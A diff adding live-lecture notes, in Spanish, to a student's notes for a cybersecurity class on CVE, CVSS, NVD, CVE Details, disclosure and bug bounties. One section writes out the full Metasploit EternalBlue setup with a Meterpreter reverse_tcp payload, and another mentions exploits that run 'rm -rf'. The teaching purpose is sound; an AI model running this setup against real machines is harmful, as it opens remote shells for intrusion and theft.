@@ -2,7 +2,7 @@
 asignatura: Ciberseguridad
 fecha: 2026-09-29
 tema: Tema 1 (1.3 a 1.5) · Clase 3 · dónde falla un sistema (CVE, CVSS, NVD)
-fuente: CIBER_Clase03_diapositivas.pdf (recibido dos veces, idéntico)
+fuente: CIBER_Clase03_diapositivas.pdf (recibido dos veces, idéntico) + transcripción de la clase en directo
 ---
 # Ciber · Clase 3 (29/09) · Dónde falla un sistema
 
@@ -105,3 +105,70 @@ Clase 4: seguridad física y el SAI — «menos terminal y más sentido común, 
 
 ## Fuentes (de las diapositivas)
 NVD nvd.nist.gov/vuln/search · cvedetails.com · Exploit-DB exploit-db.com · zerodium.com/program.html · zerodayinitiative.com · CCN-CERT · INCIBE-CERT · hackerone.com · bugcrowd.com
+
+## Notas en directo (matices del profesor, no están en las diapositivas)
+
+### Insiste otra vez: no son "pilares"
+Repite la corrección que ya hizo en la Clase 2: la documentación dice "pilares" para hardware/software/datos, pero para él son **3 sitios donde puede fallar un sistema**, no pilares. Lo dice explícitamente al empezar la clase.
+- **Hardware**: solo se puede atacar con acceso físico (equipos, discos, red, energía).
+- **Software**: aquí no se usan exploits públicos a la ligera — avisa de que "todos tienen truco": un exploit descargado de cualquier lado puede, sin que te enteres, ejecutar un `rm -rf` en tu propia máquina en vez de en la del objetivo. Más adelante dará trucos para comprobarlos antes de lanzarlos.
+- **Datos**: lo que de verdad importa proteger; el atacante no va al sitio más importante, va al **eslabón más débil**.
+
+### Cómo funciona `nmap -sV` por dentro (no estaba explicado así en la práctica)
+Lo que hace `nmap -sV` es, por cada puerto abierto, iniciar algo parecido a un **three-way handshake TCP** y quedarse "a medias" o mandar una petición pequeña: el servicio que está detrás suele responder con una cabecera o un *banner* que delata qué software y qué versión es. Con esa versión exacta ya se puede ir a buscar sus CVE. Puertos: de 0 a 65.535.
+
+### Cómo se monta un CVE — ampliación con la razón de ser
+- El problema de fondo que resuelve el CVE: si un investigador encuentra un fallo y lo publica directamente, la empresa afectada puede literalmente **denunciarle** a él por tocar su software. El CVE/CNA es el "árbitro" intermedio que legitima el aviso.
+- Flujo tal y como lo cuenta: investigador encuentra el fallo → **no lo publica en foros** → lo notifica al NVD/CNA correspondiente → se abre un **plazo de tiempo** (ventana de divulgación responsable) para que el fabricante lo arregle → solo entonces se publica la ficha con nota y CVSS.
+- El número de CVE es incremental **por año** y se reinicia en 0 al empezar el año siguiente (`CVE-2026-XXXX`, con XXXX creciendo según el mes: en septiembre ya hay números altos).
+- Quien reporta gana: prestigio, dinero (bug bounty) o ambos — "¿me veis cara de ONG?", dice, dejando claro que nadie busca fallos gratis a ese nivel.
+- Libro que recomienda sobre bug bounty: uno de la editorial **0xWord** (no dio el título exacto en este momento, solo "buscad 0xWord y bug bounty").
+
+### Demo en directo: NVD con un CVE real de Chrome
+Entró en nvd.nist.gov y abrió la ficha más reciente en ese momento: una vulnerabilidad de **Google Chrome**, **CVSS 8.8** (escala v3), que permite a un atacante remoto **ejecutar código arbitrario dentro del sandbox** del navegador a través de una página web maliciosa.
+- Fecha de publicación: **29 de mayo**. Fecha de "modificado": **21 de julio**.
+- Diálogo con Manuel sobre por qué hay ~2 meses entre ambas fechas: coincide con la ventana de divulgación responsable explicada arriba (reportar → arreglar en privado → publicar), más el tiempo de analizar y puntuar en el NVD.
+- Mensaje de fondo: **todas las actualizaciones de Chrome, Apple, etc. son de seguridad** — no son solo "mejoras".
+
+### Demo en directo: CVE Details, la web que más le gusta ("muy gráfico")
+Cambia a **cvedetails.com** porque, a diferencia del NVD (más textual), aquí se navega visualmente por año, fabricante y producto:
+- **2025**: unas **62.000** vulnerabilidades reportadas en total (cifra que dio en clase, acumulado del año, no una media).
+- Tipos de vulnerabilidad que señaló como sus favoritos para explicar: **inyección SQL** ("la típica"), **file inclusion / LFI** (su favorito — "me mola mazo", porque se hace a través de la URL, "ir para atrás y buscar cosas") y **ejecución remota de código** (el que más destaca como peligroso: "es un terremoto en tu ordenador").
+- **WordPress**: buscó por producto y mostró que la versión **7.1.1 tiene una vulnerabilidad con CVSS 8.1**, mientras que la **7.1.2 (la última en ese momento) no tiene ninguna conocida** → conclusión práctica: mantener WordPress siempre actualizado a la última versión.
+- **Microsoft Word**: también tiene CVE por decenas; mencionó una versión para Mac con **93 vulnerabilidades** registradas (y una entrada de 2016 comentada al vuelo por un alumno).
+- **Adobe Reader**: CVE de **2019, CVSS 6.5**, descrito como un ataque de *bypass* que podría revelar información (fuga de información, sin ser crítico).
+- Aclaración de un alumno: Adobe Flash no aparece porque ya no existe/no se sigue contando.
+
+### Anécdota: Log4Shell y el rover de Marte
+A propósito de **Log4Shell (CVE-2021-44228, Log4j)**, cuenta que la librería (de registro de logs en Java) la usan NASA, administraciones y "muchísimos sitios", y que la vulnerabilidad permitía inyectar código y conectarse a la máquina afectada solo por tener la librería cargada — "una auténtica barbaridad", CVSS 10. Manuel recuerda, sin estar 100% seguro de la fuente, una noticia (no ciencia-ficción) sobre un **rover en Marte** que se había quedado inoperativo por problemas de conexión con la antena y que fue posible **reactivarlo en remoto aprovechando esa misma vulnerabilidad**. Ninguno de los dos cierra el dato con una fuente exacta — queda como anécdota a verificar, no como hecho confirmado.
+
+### Metasploit en directo contra EternalBlue (solo configuración, no se llega a lanzar con éxito)
+Repite y amplía la demo de la Clase/Lab anteriores, esta vez explicando cada opción al rellenarla:
+```bash
+msfconsole
+search eternalblue                                  # o: search ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+info                                                  # describe el módulo: afecta a SMB/445, da CVE/CVSS
+show options
+set RHOST 10.0.0.15        # RHOST = la máquina objetivo (remote host)
+set LHOST <mi IP de Kali>  # LHOST = yo, adonde vuelve la conexión (ya detectado solo)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+show options                # para comprobar que ha quedado todo bien configurado
+exploit                     # (o run) -> en la demo no hay máquina real escuchando: no consigue conectar
+```
+- **RHOST/RPORT**: el objetivo y su puerto (445, no hace falta tocarlo). **LHOST/LPORT**: quién soy yo y por dónde vuelve la conexión inversa (reverse shell). No hace falta contraseña porque el fallo es de protocolo, no de login.
+- **Payload**: el código que se inyecta una vez dentro. El más usado es **Meterpreter** (disponible para Windows, Linux, etc.); una vez cargado permite, por ejemplo, descargar la lista de usuarios, instalar un keylogger, etc.
+- En la demo real tecleó mal una IP (le faltaba un punto) — Manuel se lo corrigió en directo — y, aun corrigiéndolo, el `exploit` no llega a ningún lado porque no hay una máquina real vulnerable escuchando en ese momento: queda como ejemplo de la sintaxis, no como ataque completado.
+- Aclara que con otros módulos auxiliares de Metasploit también se puede hacer **denegación de servicio** (hay módulos específicos para DoS), aunque eso "es otro mundo".
+- Otros CVE que menciona de pasada en este bloque: **PwnKit** (Linux), **WPScan** (herramienta específica para auditar WordPress, "te lo tiene casi todo preparado"), salto de directorio en Apache.
+
+### Amenazas (1.5) — ampliación
+- Insiste en que el **insider / empleado descontento** es, para él, uno de los vectores de ataque más importantes en el mundo empresarial — más que el atacante externo. Recomienda vigilar el ambiente laboral y usar herramientas de detección adecuadas.
+- **BYOD (Bring Your Own Device)**: lo critica abiertamente, sobre todo a raíz de la pandemia — con todo el mundo trabajando desde casa con ordenadores personales usados también para torrents y descargas, fue "uno de los periodos con más ataques en la historia de la ciberseguridad". Chiste recurrente: BYOD se le confunde con la marca de coches BYD.
+- Familias de malware más comunes citadas: virus, gusano, troyano, ransomware.
+
+### Bug bounty — por qué le interesa a una empresa (razonamiento económico)
+Explica por qué Google/Apple/Microsoft prefieren pagar bug bounty en vez de contratar un pentester fijo: contratar a un experto concreto para que ataque es caro; abrir un programa público de recompensas permite tener, en la práctica, **pentesting gratuito de mucha gente a la vez** y solo pagar a quien realmente encuentra algo. Cifra que repite: del orden de **80 millones de dólares pagados en un año** vía HackerOne. Advierte seriamente de no vender nunca un fallo en el mercado negro: hay casos conocidos de gente localizada y perseguida por ello, "a por ti y a por tu familia".
+
+### Cierre de la clase
+Frase con la que resume el apartado de amenazas y vulnerabilidades: **hay dos tipos de empresas: las que tienen sus CVE sin parchear, y las que todavía no saben que los tienen** (conocidas vs. no conocidas). Deberes para el fin de semana (no puntúan): coger un CVE por CVE Details, situarlo en su "sitio" (activo→vulnerabilidad→amenaza→riesgo) y trastear metiendo el propio router o un CMS que no sea WordPress.
